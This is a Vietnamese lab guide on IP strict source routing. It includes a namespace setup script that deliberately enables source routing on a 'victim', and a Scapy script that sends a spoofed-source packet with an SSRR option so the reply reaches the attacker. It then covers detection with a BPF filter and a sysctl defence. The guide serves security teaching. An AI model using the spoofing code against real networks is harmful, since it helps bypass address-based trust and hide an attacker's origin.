# HƯỚNG DẪN THỰC HÀNH: LAB 02
## IP Source Routing Vulnerability (SSRR / LSRR)

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG
- **Mục tiêu:** Lợi dụng tùy chọn IP Strict Source and Record Route (SSRR - Type 137) để ép buộc máy chủ phản hồi gói tin qua các router chỉ định, chứng minh cách kẻ tấn công giả mạo IP nguồn (`10.0.0.77`) nhưng vẫn nhận được phản hồi hai chiều về chính mình (`10.0.0.1`). Sau đó kiểm chứng cơ chế phòng thủ lọc gói tin IP Options bằng BPF (`ip[0] & 0x0f > 5`) và tham số `sysctl accept_source_route = 0`.
- **Topology:**
  - `h1`: `10.0.0.1/24` (Attacker) trên `veth1`
  - `h2`: `10.0.0.2/24` (Victim) trên `veth2`
  - Địa chỉ giả mạo (Spoofed IP): `10.0.0.77`

> 💡 **Quy ước thực thi lệnh:**
> - `[VICTIM - h2]`: Lệnh chạy trong namespace nạn nhân (tiền tố `ip netns exec h2`).
> - `[ATTACKER - h1]`: Lệnh chạy trong namespace kẻ tấn công (tiền tố `ip netns exec h1`).
> - `[HOST / CHUNG]`: Lệnh chạy trực tiếp trên máy ảo Kali.

---

### 2. BƯỚC 1: KHỞI TẠO THƯ MỤC VÀ TẠO CÁC SCRIPT

Tạo thư mục `/tmp/lab02` và tạo 2 script bằng `cat << 'EOF'` (hoặc dùng `nano <tên_file>` để soạn thảo):

```bash
mkdir -p /tmp/lab02 && cd /tmp/lab02

# 1. Script thiết lập mạng: setup_pair.sh
cat << 'EOF' > /tmp/lab02/setup_pair.sh
#!/usr/bin/env bash
set -e

echo "[*] Dọn dẹp namespace cũ..."
ip netns del h1 2>/dev/null || true
ip netns del h2 2>/dev/null || true

echo "[*] Tạo 2 namespace h1 (Attacker) và h2 (Victim)..."
ip netns add h1
ip netns add h2

echo "[*] Tạo veth pair nối h1 và h2..."
ip link add veth1 type veth peer name veth2
ip link set veth1 netns h1
ip link set veth2 netns h2

echo "[*] Cấu hình địa chỉ IP..."
ip netns exec h1 ip link set dev lo up
ip netns exec h1 ip addr add 10.0.0.1/24 dev veth1
ip netns exec h1 ip link set dev veth1 up

ip netns exec h2 ip link set dev lo up
ip netns exec h2 ip addr add 10.0.0.2/24 dev veth2
ip netns exec h2 ip link set dev veth2 up

# Tĩnh ARP trên h2 cho IP giả mạo 10.0.0.77 trỏ về MAC của veth1
VETH1_MAC=$(ip netns exec h1 cat /sys/class/net/veth1/address)
ip netns exec h2 ip neigh replace 10.0.0.77 lladdr "$VETH1_MAC" dev veth2

# Bật tính năng chấp nhận Source Route trên h2 (Tái tạo điều kiện dễ bị tổn thương)
for dev in all default lo veth2; do
    ip netns exec h2 sysctl -w net.ipv4.conf.$dev.accept_source_route=1
    ip netns exec h2 sysctl -w net.ipv4.conf.$dev.rp_filter=0
done
ip netns exec h2 sysctl -w net.ipv4.ip_forward=1

echo "[+] Kiểm tra ping baseline giữa h1 và h2:"
ip netns exec h1 ping -c 2 10.0.0.2
echo "[+] Khởi tạo môi trường hoàn tất!"
EOF
chmod +x /tmp/lab02/setup_pair.sh

# 2. Script gửi gói tin SSRR: ssrr.py
cat << 'EOF' > /tmp/lab02/ssrr.py
#!/usr/bin/env python3
"""
Lab 02: IP Strict Source Routing (SSRR) Packet Crafting
"""
from scapy.all import IP, ICMP, IPOption_SSRR, send

target_ip = "10.0.0.2"
spoofed_ip = "10.0.0.77"
attacker_real_ip = "10.0.0.1"

print(f"[*] Chế tạo gói tin ICMP Echo Request mang tùy chọn SSRR:")
print(f"    - IP Nguồn giả mạo: {spoofed_ip}")
print(f"    - IP Đích đến     : {target_ip}")
print(f"    - Lộ trình SSRR   : [{attacker_real_ip}, {target_ip}]")

# Tạo gói tin có IP Option SSRR
opt = IPOption_SSRR(routers=[attacker_real_ip, target_ip])
pkt = IP(src=spoofed_ip, dst=target_ip, options=[opt]) / ICMP(id=0x4242) / b"src-routed-probe"

send(pkt, iface="veth1", verbose=1)
print("[+] Đã gửi gói tin SSRR thành công!")
EOF
```

---

### 3. BƯỚC 2: CHẠY THIẾT LẬP MẠNG

```bash
# [HOST / CHUNG] Thiết lập topology h1 <-> h2
sudo bash /tmp/lab02/setup_pair.sh
```

---

### 4. BƯỚC 3: PHÁT ĐỘNG TẤN CÔNG & BẮT GÓI PHẢN HỒI

1. **[ATTACKER - h1]** Mở `tcpdump` trên `h1` để bắt gói tin phản hồi dội ngược về kẻ tấn công:
   ```bash
   sudo ip netns exec h1 tcpdump -i veth1 -nn -v icmp > /tmp/lab02/tcpdump_h1.log 2>&1 &
   sleep 1
   ```
2. **[VICTIM - h2]** Mở song song `tcpdump` trên `h2` với bộ lọc BPF kiểm tra IP Options (`ip[0] & 0x0f > 5`):
   ```bash
   sudo ip netns exec h2 tcpdump -i veth2 -nn "ip[0] & 0x0f > 5" > /tmp/lab02/tcpdump_h2_options.log 2>&1 &
   sleep 1
   ```
3. **[ATTACKER - h1]** Chạy script gửi gói tin SSRR từ `h1`:
   ```bash
   sudo ip netns exec h1 python3 /tmp/lab02/ssrr.py
   sleep 2
   ```

---

### 5. BƯỚC 4: KIỂM CHỨNG KẾT QUẢ

1. **[ATTACKER - h1]** Kiểm tra log bắt gói trên kẻ tấn công (`h1`):
   ```bash
   cat /tmp/lab02/tcpdump_h1.log
   ```
   *Kỳ vọng:* Thấy gói Echo Request gửi từ `10.0.0.77 > 10.0.0.2` kèm `SSRR{10.0.0.1, 10.0.0.2}`, và sau đó nhận được gói Echo Reply dội về địa chỉ thật của kẻ tấn công `10.0.0.1`!

2. **[VICTIM - h2]** Kiểm tra bộ lọc BPF bắt gói IP Options trên nạn nhân (`h2`):
   ```bash
   cat /tmp/lab02/tcpdump_h2_options.log
   ```
   *Kỳ vọng:* Bắt được gói tin vì trường IHL (Header Length) > 5 (đạt 8 tức 32 bytes do có thêm 12 bytes tùy chọn SSRR).

---

### 6. BƯỚC 5: KÍCH HOẠT PHÒNG THỦ & KIỂM CHỨNG LẠI

1. **[VICTIM - h2]** Tắt tính năng chấp nhận Source Route trên `h2`:
   ```bash
   for dev in all default lo veth2; do
       sudo ip netns exec h2 sysctl -w net.ipv4.conf.$dev.accept_source_route=0
   done
   ```
2. **[ATTACKER - h1]** Mở lại tcpdump trên `h1` và gửi lại gói SSRR:
   ```bash
   sudo ip netns exec h1 tcpdump -i veth1 -nn icmp > /tmp/lab02/tcpdump_defended.log 2>&1 &
   sleep 1
   sudo ip netns exec h1 python3 /tmp/lab02/ssrr.py
   sleep 2
   ```
3. **[ATTACKER - h1]** Đọc log kiểm tra:
   ```bash
   cat /tmp/lab02/tcpdump_defended.log
   ```
   *Kỳ vọng:* Chỉ có 1 gói Echo Request đi ra, **0 gói phản hồi nào quay về** (Kernel nạn nhân đã drop gói tin ngay lập tức).

---

### 7. BƯỚC 6: DỌN DẸP MÔI TRƯỜNG

```bash
# [HOST / CHUNG] Tắt tiến trình nền và xóa namespaces
sudo pkill -f tcpdump 2>/dev/null || true
sudo ip netns del h1 2>/dev/null || true
sudo ip netns del h2 2>/dev/null || true
sudo rm -rf /tmp/lab02
```
